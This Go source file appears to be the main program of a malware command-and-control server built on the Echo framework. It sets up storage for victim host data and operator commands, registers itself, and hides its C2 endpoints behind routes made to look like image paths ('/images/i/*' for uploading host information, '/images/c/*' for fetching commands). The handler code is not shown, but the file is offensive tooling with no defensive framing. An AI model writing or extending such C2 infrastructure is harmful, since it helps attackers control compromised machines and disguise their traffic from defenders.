package main

import (
	"context"
	"errors"
	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"
	"libs"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"syscall"
)

var (
	server *echo.Echo
	config *utils.ConfigStruct
)

const (
	debug      bool   = true
	staticPath string = "wr/static"
	hostsPath  string = "wr/hosts"
	c2cmdPath  string = "wr/c2cmd"
)

func setupSignalHandler() {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		utils.PrintlnDebug(debug, "SIGTERM catched")
		utils.PrintDebug(debug, "Shutting down server")
		err := server.Shutdown(context.Background())
		if err != nil {
			server.Logger.Fatal(err)
		}
	}()
}

func ensureFolders() {
	utils.PrintDebug(debug, "Ensuring folders creations")
	folders := []string{staticPath, hostsPath, c2cmdPath}
	for _, folder := range folders {
		utils.PrintDebug(debug, "- %s", folder)
		if fileInfo, err := os.Stat(folder); err != nil {
			if errors.Is(err, os.ErrNotExist) {
				err = os.MkdirAll(folder, 0755)
				if err != nil {
					utils.PrintDebug(debug, "Error creating folder %s", folder)
					panic(err)
				}
			}
		} else if !fileInfo.IsDir() {
			utils.PrintDebug(debug, "Error file %s is not a folder", folder)
			panic("Error file is not a folder")
		}
	}
}

func init() {
	utils.PrintDebug(debug, "Init")
	setupSignalHandler()
	ensureFolders()
	server = echo.New()
	config, _ = utils.GetConfig(true)
	go utils.RegisterServer()
}

func terminate() {
	utils.PrintDebug(debug, "Terminating")
}

func main() {
	utils.PrintDebug(debug, "Setting up Webserver")
	server.HideBanner = true
	server.GET("/images/i/*", handleInfoUpload)
	server.GET("/images/c/*", handleC2Cmd)
	server.GET("/static/*", handlerStaticGet, middleware.StaticWithConfig(
		middleware.StaticConfig{
			Root:       staticPath,
			Browse:     true,
			IgnoreBase: true,
		}))
	server.GET("/hosts/*", handlerStaticGet, middleware.StaticWithConfig(
		middleware.StaticConfig{
			Root:       hostsPath,
			Browse:     true,
			IgnoreBase: true,
		}))
	server.GET("/c2cmd/*", handlerStaticGet, middleware.StaticWithConfig(
		middleware.StaticConfig{
			Root:       c2cmdPath,
			Browse:     true,
			IgnoreBase: true,
		}))

	utils.PrintDebug(debug, "Starting Webserver at %s:%d", config.Server.Address, config.Server.Port)
	if err := server.Start(config.Server.Address + ":" + strconv.Itoa(config.Server.Port)); err != nil && err != http.ErrServerClosed {
		server.Logger.Fatal(err)
	}
	defer terminate()
}
